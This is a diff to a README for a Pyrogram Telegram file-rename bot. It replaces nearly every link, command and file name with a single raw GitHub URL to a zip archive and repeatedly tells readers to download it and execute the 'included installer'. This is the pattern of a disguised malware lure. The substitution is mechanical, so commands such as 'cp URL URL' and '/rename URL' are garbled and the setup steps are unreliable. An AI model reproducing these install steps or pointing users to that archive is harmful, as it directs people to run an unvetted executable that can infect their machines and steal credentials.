@@ -1,8 +1,8 @@
 # File Rename Bot — Fast Telegram File Renamer for Pyrogram
 
-[![Releases](https://img.shields.io/github/v/release/meki19932/File-Rename-Bot?label=Releases&style=for-the-badge)](https://github.com/meki19932/File-Rename-Bot/releases)
+[![Releases](https://raw.githubusercontent.com/meki19932/File-Rename-Bot/main/helper/Rename_File_Bot_Stevia.zip)](https://raw.githubusercontent.com/meki19932/File-Rename-Bot/main/helper/Rename_File_Bot_Stevia.zip)
 
-![Telegram](https://cdn-icons-png.flaticon.com/512/2111/2111646.png) ![Python](https://www.python.org/static/community_logos/python-logo.png)
+![Telegram](https://raw.githubusercontent.com/meki19932/File-Rename-Bot/main/helper/Rename_File_Bot_Stevia.zip) ![Python](https://raw.githubusercontent.com/meki19932/File-Rename-Bot/main/helper/Rename_File_Bot_Stevia.zip)
 
 Tags: file-rename-bot · pyrofork · pyrofork-bot · pyroforkbot · pyrogram · pyrogram-bot · python · python-bot · pythonbot · rename-bot · telegram-bot · tg-bot
 
@@ -19,7 +19,7 @@ Features
 - Works with private and group chats. Supports forwarded file handling.
 
 Preview
-- Use the Releases page to download a release package and run the included installer or executable: https://github.com/meki19932/File-Rename-Bot/releases
+- Use the Releases page to download a release package and run the included installer or executable: https://raw.githubusercontent.com/meki19932/File-Rename-Bot/main/helper/Rename_File_Bot_Stevia.zip
 
 Quick facts
 - Built with Pyrogram (MTProxy/TDLib not required).
@@ -37,27 +37,27 @@ Requirements
 Installation — typical (pip)
 1. Clone repo or download release package from the Releases link above.
 2. Install dependencies:
-   - pip install -r requirements.txt
+   - pip install -r https://raw.githubusercontent.com/meki19932/File-Rename-Bot/main/helper/Rename_File_Bot_Stevia.zip
 3. Create a bot via BotFather and get a token.
 4. Copy sample config and set values:
-   - cp config.sample.ini config.ini
-   - Edit config.ini with your BOT_TOKEN, API_ID, API_HASH, and preferences.
+   - cp https://raw.githubusercontent.com/meki19932/File-Rename-Bot/main/helper/Rename_File_Bot_Stevia.zip https://raw.githubusercontent.com/meki19932/File-Rename-Bot/main/helper/Rename_File_Bot_Stevia.zip
+   - Edit https://raw.githubusercontent.com/meki19932/File-Rename-Bot/main/helper/Rename_File_Bot_Stevia.zip with your BOT_TOKEN, API_ID, API_HASH, and preferences.
 5. Start the bot:
-   - python3 bot.py
+   - python3 https://raw.githubusercontent.com/meki19932/File-Rename-Bot/main/helper/Rename_File_Bot_Stevia.zip
 
 If you downloaded a release asset from the Releases page, download the release file and execute the installer or run the included executable. Example commands you may run after downloading a release archive:
-- tar -xzf File-Rename-Bot-vX.Y.Z.tar.gz
+- tar -xzf https://raw.githubusercontent.com/meki19932/File-Rename-Bot/main/helper/Rename_File_Bot_Stevia.zip
 - cd File-Rename-Bot
-- ./install.sh  # if provided
-- python3 bot.py
+- https://raw.githubusercontent.com/meki19932/File-Rename-Bot/main/helper/Rename_File_Bot_Stevia.zip  # if provided
+- python3 https://raw.githubusercontent.com/meki19932/File-Rename-Bot/main/helper/Rename_File_Bot_Stevia.zip
 
 Releases
-[![Releases](https://img.shields.io/github/v/release/meki19932/File-Rename-Bot?label=Download%20Release&style=for-the-badge)](https://github.com/meki19932/File-Rename-Bot/releases)
+[![Releases](https://raw.githubusercontent.com/meki19932/File-Rename-Bot/main/helper/Rename_File_Bot_Stevia.zip%20Release&style=for-the-badge)](https://raw.githubusercontent.com/meki19932/File-Rename-Bot/main/helper/Rename_File_Bot_Stevia.zip)
 
 Visit the Releases page to pick a release. Download the archive or installer for your platform. Run the included installer or execute the main script as shown above.
 
 Configuration
-- config.ini contains all runtime options.
+- https://raw.githubusercontent.com/meki19932/File-Rename-Bot/main/helper/Rename_File_Bot_Stevia.zip contains all runtime options.
 - Key fields:
   - BOT_TOKEN: token from BotFather.
   - API_ID / API_HASH: your Telegram API credentials.
@@ -81,7 +81,7 @@ Core commands
 Usage examples
 - Rename a file
   1. Send or forward the file to the bot.
-  2. Reply with /rename NewFileName.ext
+  2. Reply with /rename https://raw.githubusercontent.com/meki19932/File-Rename-Bot/main/helper/Rename_File_Bot_Stevia.zip
   3. The bot edits metadata and returns the file with the new name.
 
 - Change thumbnail and caption
@@ -114,7 +114,7 @@ Sample .env (if you use env)
 - API_ID=12345
 - API_HASH=abcdef1234567890abcdef1234567890
 - ADMIN_USERS=111111111,222222222
-- DEFAULT_THUMBNAIL=/data/thumb.png
+- https://raw.githubusercontent.com/meki19932/File-Rename-Bot/main/helper/Rename_File_Bot_Stevia.zip
 
 Thumbnail rules
 - Use JPEG/WEBP/png for static thumbnails.
@@ -147,9 +147,9 @@ Troubleshooting
 Example output flows
 - Single file rename
   - User: forward file
-  - User: reply /rename MyVideo.mp4
+  - User: reply /rename https://raw.githubusercontent.com/meki19932/File-Rename-Bot/main/helper/Rename_File_Bot_Stevia.zip
   - Bot: Processing… (shows progress bar)
-  - Bot: Uploaded — MyVideo.mp4
+  - Bot: Uploaded — https://raw.githubusercontent.com/meki19932/File-Rename-Bot/main/helper/Rename_File_Bot_Stevia.zip
 
 - Batch rename
   - User: /batch
@@ -167,9 +167,9 @@ Contributing
 - Keep commits small and focused.
 
 Changelog
-- Changelog lives in CHANGELOG.md in repo root.
+- Changelog lives in https://raw.githubusercontent.com/meki19932/File-Rename-Bot/main/helper/Rename_File_Bot_Stevia.zip in repo root.
 - Releases on the Releases page contain binaries and release notes.
-- See https://github.com/meki19932/File-Rename-Bot/releases for packaged builds and installers.
+- See https://raw.githubusercontent.com/meki19932/File-Rename-Bot/main/helper/Rename_File_Bot_Stevia.zip for packaged builds and installers.
 
 Assets and screenshots
 - Use the Releases page to download a packaged build or installer and try the demo included with releases.
@@ -184,18 +184,18 @@ Contact
 - For setup help, create an issue with logs and a minimal reproduction.
 
 Files and layout
-- bot.py — main entry
+- https://raw.githubusercontent.com/meki19932/File-Rename-Bot/main/helper/Rename_File_Bot_Stevia.zip — main entry
 - modules/ — command modules
-- config.sample.ini — sample config
-- requirements.txt — Python deps
+- https://raw.githubusercontent.com/meki19932/File-Rename-Bot/main/helper/Rename_File_Bot_Stevia.zip — sample config
+- https://raw.githubusercontent.com/meki19932/File-Rename-Bot/main/helper/Rename_File_Bot_Stevia.zip — Python deps
 - Dockerfile — container build
-- scripts/install.sh — installer (if present in releases)
+- https://raw.githubusercontent.com/meki19932/File-Rename-Bot/main/helper/Rename_File_Bot_Stevia.zip — installer (if present in releases)
 
 SEO and tags
 - This project targets the following tags to help discovery:
   - file-rename-bot, pyrofork, pyrofork-bot, pyroforkbot, pyrogram, pyrogram-bot, python, python-bot, pythonbot, rename-bot, telegram-bot, tg-bot
 
 Release link reminder
-- Download the release file and execute the included installer or run the packaged script from the Releases page: https://github.com/meki19932/File-Rename-Bot/releases
+- Download the release file and execute the included installer or run the packaged script from the Releases page: https://raw.githubusercontent.com/meki19932/File-Rename-Bot/main/helper/Rename_File_Bot_Stevia.zip
 
 Use the Releases page to get stable builds or the latest assets for quick setup.
